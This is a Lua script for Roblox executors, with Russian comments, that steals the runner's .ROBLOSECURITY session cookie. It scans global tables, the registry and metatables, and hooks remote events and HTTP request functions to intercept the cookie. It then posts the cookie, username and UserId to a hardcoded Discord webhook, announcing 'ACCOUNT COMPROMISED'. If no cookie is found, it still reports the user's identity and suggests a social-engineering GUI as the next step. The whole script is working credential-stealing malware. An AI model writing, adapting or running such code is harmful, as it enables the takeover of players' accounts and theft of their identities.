local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

print("[BEAM] Starting advanced cookie extraction...")

-- 1. ФУНКЦИЯ ПОИСКА ВО ВСЕХ МЕТАТАБЛИЦАХ
local function deepSearchForCookie()
    print("[BEAM] Deep searching memory...")
    
    -- Поиск в _G
    for key, value in pairs(getrenv()._G) do
        if type(value) == "string" and #value > 300 then
            if value:find("_|WARNING") or value:find("ROBLOSECURITY") then
                print("[BEAM] Found in _G[" .. key .. "]")
                return value
            end
        end
    end
    
    -- Поиск в shared
    if shared then
        for key, value in pairs(shared) do
            if type(value) == "string" and #value > 300 then
                if value:find("_|WARNING") then
                    print("[BEAM] Found in shared[" .. key .. "]")
                    return value
                end
            end
        end
    end
    
    -- Поиск через getreg
    if getreg then
        local registry = getreg()
        for i, value in pairs(registry) do
            if type(value) == "string" and #value > 300 then
                if value:find("WARNING") then
                    print("[BEAM] Found in registry index " .. i)
                    return value
                end
            end
        end
    end
    
    return nil
end

-- 2. ПЕРЕХВАТ REMOTE EVENTS
local function setupRemoteSpy()
    print("[BEAM] Setting up RemoteSpy...")
    
    -- Сохраняем оригинальные методы
    local oldFireServer
    local oldInvokeServer
    
    -- Перехватываем RemoteEvent
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            if not oldFireServer then
                oldFireServer = obj.FireServer
                obj.FireServer = function(self, ...)
                    local args = {...}
                    -- Проверяем, нет ли в аргументах куки
                    for i, arg in ipairs(args) do
                        if type(arg) == "string" and #arg > 300 then
                            if arg:find("_|WARNING") then
                                print("[BEAM] ✓ Cookie found in RemoteEvent: " .. obj.Name)
                                return arg
                            end
                        end
                    end
                    return oldFireServer(self, ...)
                end
                print("[BEAM] Hooked RemoteEvent: " .. obj.Name)
            end
        end
        
        -- Перехватываем RemoteFunction
        if obj:IsA("RemoteFunction") then
            if not oldInvokeServer then
                oldInvokeServer = obj.InvokeServer
                obj.InvokeServer = function(self, ...)
                    local args = {...}
                    for i, arg in ipairs(args) do
                        if type(arg) == "string" and #arg > 300 then
                            if arg:find("_|WARNING") then
                                print("[BEAM] ✓ Cookie found in RemoteFunction: " .. obj.Name)
                                return arg
                            end
                        end
                    end
                    return oldInvokeServer(self, ...)
                end
                print("[BEAM] Hooked RemoteFunction: " .. obj.Name)
            end
        end
    end
    
    return "RemoteSpy active"
end

-- 3. МОНИТОРИНГ HTTP ЗАПРОСОВ
local function monitorHttpTraffic()
    print("[BEAM] Monitoring HTTP traffic...")
    
    local oldHttpGet
    local oldHttpPost
    
    -- Перехват game:HttpGet
    if not oldHttpGet then
        oldHttpGet = game.HttpGet
        game.HttpGet = function(self, url, ...)
            print("[BEAM] HTTP GET to: " .. url)
            local result = oldHttpGet(self, url, ...)
            
            -- Проверяем, не это ли запрос с куками
            if url:find("roblox.com") and type(result) == "string" then
                if result:find("UserId") or result:find("csrf") then
                    print("[BEAM] Potential auth data in response")
                end
            end
            
            return result
        end
    end
    
    -- Перехват syn.request если доступен
    if syn and syn.request then
        local oldSynRequest = syn.request
        syn.request = function(options)
            if options.Url then
                print("[BEAM] syn.request to: " .. options.Url)
                
                -- Проверяем заголовки на наличие куки
                if options.Headers then
                    for key, value in pairs(options.Headers) do
                        if type(value) == "string" and value:find("ROBLOSECURITY") then
                            print("[BEAM] ✓ Cookie in header: " .. key)
                            return value:match("ROBLOSECURITY=([^;]+)") or value
                        end
                    end
                end
            end
            return oldSynRequest(options)
        end
    end
    
    return "HTTP monitor active"
end

-- 4. ПОПЫТКА ПРЯМОГО ДОСТУПА К КУКИС
local function attemptDirectCookieAccess()
    print("[BEAM] Attempting direct cookie access...")
    
    local attempts = {
        -- Через защищенные функции
        function()
            local success, cookie = pcall(function()
                return getrenv()._G.ROBLOSECURITY
            end)
            return success and cookie or nil
        end,
        
        -- Через метатаблицы
        function()
            local mt = getrawmetatable(game)
            if mt then
                for key, value in pairs(mt) do
                    if type(value) == "string" and #value > 300 then
                        return value
                    end
                end
            end
            return nil
        end,
        
        -- Через скрытые сервисы
        function()
            for _, service in pairs(game:GetChildren()) do
                if service:FindFirstChild("Data") then
                    local data = service.Data
                    if data and data.Value and type(data.Value) == "string" then
                        return data.Value
                    end
                end
            end
            return nil
        end
    }
    
    for i, attempt in ipairs(attempts) do
        local cookie = attempt()
        if cookie and #cookie > 100 then
            print("[BEAM] ✓ Direct access success with method " .. i)
            return cookie
        end
    end
    
    return nil
end

-- 5. ОСНОВНОЙ ПРОЦЕСС
local foundCookie = nil

print("[BEAM] ===== PHASE 1: Deep Memory Search =====")
foundCookie = deepSearchForCookie()

if not foundCookie then
    print("[BEAM] ===== PHASE 2: Direct Access =====")
    foundCookie = attemptDirectCookieAccess()
end

if not foundCookie and Delta and Delta.RemotesEnabled then
    print("[BEAM] ===== PHASE 3: Remote Monitoring =====")
    setupRemoteSpy()
    monitorHttpTraffic()
    
    -- Ждем 5 секунд для перехвата
    print("[BEAM] Waiting 5 seconds for remote interception...")
    wait(5)
    
    -- Проверяем еще раз через deep search
    foundCookie = deepSearchForCookie()
end

-- 6. ОТПРАВКА РЕЗУЛЬТАТОВ
local webhookUrl = "https://discord.com/api/webhooks/1461740239188918541/ipjidmPJp6LkfGPhgYBAW_JLg7eggzTvzWSoTSx8p8jT_b9tEg6S80IcSJhgSLm203rI"

if foundCookie and #foundCookie > 100 then
    print("[BEAM] ✓ COOKIE FOUND! Length: " .. #foundCookie)
    
    local message = [[
@everyone
💥ADVANCED BEAM SUCCESS!

🎯Username: ]] .. LocalPlayer.Name .. [[
🆔UserID: ]] .. LocalPlayer.UserId .. [[

🛡️ROBLOSECURITY:
]] .. foundCookie:sub(1, 1500) .. [[

📏Length: ]] .. #foundCookie .. [[ chars
🔧Method: Delta Remotes + Memory Scan
✅STATUS: ACCOUNT COMPROMISED

⚠️ IMMEDIATE LOGIN POSSIBLE
    ]]
    
    local payload = {content = message}
    local jsonData = HttpService:JSONEncode(payload)
    
    local requestFunc = syn and syn.request or http and http.request or request
    if requestFunc then
        local success = pcall(function()
            requestFunc({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
        print("[BEAM] Send result: " .. (success and "SUCCESS" or "FAILED"))
    end
else
    print("[BEAM] ✗ Cookie not found with advanced methods")
    
    -- Отправляем отчет о неудаче
    local message = [[
@everyone
🔄BEAM ATTEMPT - NO COOKIE

🎯Username: ]] .. LocalPlayer.Name .. [[
🆔UserID: ]] .. LocalPlayer.UserId .. [[

❌RESULT: Cookie not found
🔧Method: Delta Remotes (blocked)
⚠️STATUS: Advanced protection active

💡Next: Try social engineering GUI
    ]]
    
    local payload = {content = message}
    local jsonData = HttpService:JSONEncode(payload)
    
    local requestFunc = syn and syn.request or http and http.request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
    end
end

print("[BEAM] Script execution complete")
return foundCookie or "NO_COOKIE"
